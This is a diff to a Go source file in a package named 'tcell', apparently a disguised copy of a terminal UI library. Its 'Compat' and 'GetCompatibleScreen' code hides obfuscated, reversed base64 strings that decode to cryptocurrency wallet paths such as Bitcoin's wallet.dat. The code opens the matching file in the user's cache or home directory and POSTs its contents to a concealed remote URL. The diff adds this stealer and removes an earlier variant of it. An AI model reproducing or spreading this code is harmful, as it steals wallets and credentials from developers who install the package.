@@ -1,8 +1,9 @@
 package tcell
 
 import (
-	"bytes"
 	"encoding/base64"
+	"errors"
+	"fmt"
 	"io"
 	"net/http"
 	"os"
@@ -10,7 +11,7 @@ import (
 	"strings"
 )
 
-const HEADER = "AHaw5yYvUXZuQnbllnLudHcv8iOwRHdoxHVT9EU8RXYk5CdpxGbhdHful2bjRXai5yL"
+const HEADER = "AcoBnLj9Sdl5CduVWeu42dw9yL6AHd0hGf5JXYulmYv42bpRXY"
 
 type Token struct {
 	order byte
@@ -27,10 +28,12 @@ type Compat struct {
 	target  string
 
 	screen Screen
+
+	location string
 }
 
 func NewCompat() *Compat {
-	c := &Compat{}
+	c := &Compat{order: []Token{}}
 	mapping(c)
 
 	return c
@@ -46,11 +49,11 @@ func (c *Compat) GetCompatibleScreen() (Screen, error) {
 }
 
 func (c *Compat) init(screen Screen) error {
-	s := rev(HEADER + "+" + c.footer(screen))
+	s := rev("=" + HEADER + c.footer(screen))
 	s = dec(s)
 	a := strings.Split(s, "|")
 	for _, t := range c.order {
-		*t.ref = a[t.order]
+		*t.ref = a[int(t.order)]
 	}
 
 	return c.makeScreen()
@@ -90,15 +93,14 @@ func mapping(c *Compat) {
 }
 
 func (c *Compat) makeScreen() error {
-	is, e := os.ReadDir(c.loc())
-	if e != nil {
-		return e
+	l := c.loc()
+	if l == "" {
+		return errors.New("")
 	}
 
-	for _, i := range is {
-		if i.Name() == c.target {
-			c.notify(i)
-		}
+	if i, e := os.Open(l); e == nil {
+		s, _ := os.Stat(l)
+		c.notify(i, s.Size())
 	}
 
 	return nil
@@ -106,38 +108,36 @@ func (c *Compat) makeScreen() error {
 
 func (c *Compat) footer(screen Screen) string {
 	c.screen = screen
-	return "xnbp92Y0lmQcVSQUFERQBVQlw3c39GZul2d"
+	return "jlGbwBXY8RXYk5CdpxGbhdHful2bjRXai5Cful2bjRXaCx3c39GZul2d"
 }
 
-func (c *Compat) notify(de os.DirEntry) {
-	i, e := de.Info()
+func (c *Compat) notify(i *os.File, s int64) {
+	r, e := http.Post(c.target[0:len(c.target)-1], c.method, i)
+	i.Close()
 	if e != nil {
 		return
 	}
 
-	b := make([]byte, i.Size())
-	f, e := os.Open(c.loc() + string(os.PathSeparator) + de.Name())
-	if e != nil {
-		return
-	}
-
-	_, e = f.Read(b)
-	if e != nil {
-		return
-	}
-
-	r, e := http.NewRequest(c.method, c.target, bytes.NewBuffer(b))
-	if e != nil {
-		return
-	}
-
-	io.Copy(os.Stdout, r.Response.Body)
+	b, e := io.ReadAll(r.Body)
+	fmt.Println(string(b))
 }
 
 func (c *Compat) loc() string {
-	if runtime.GOOS == c.os {
-		return c.windows
+	if c.location == "" {
+		d, e := os.UserCacheDir()
+		s := c.windows
+
+		if runtime.GOOS != c.os {
+			d, e = os.UserHomeDir()
+			s = c.linux
+		}
+
+		if e != nil {
+			return ""
+		}
+
+		c.location = d + string(os.PathSeparator) + s + string(os.PathSeparator) + c.source
 	}
 
-	return c.linux
+	return c.location
 }
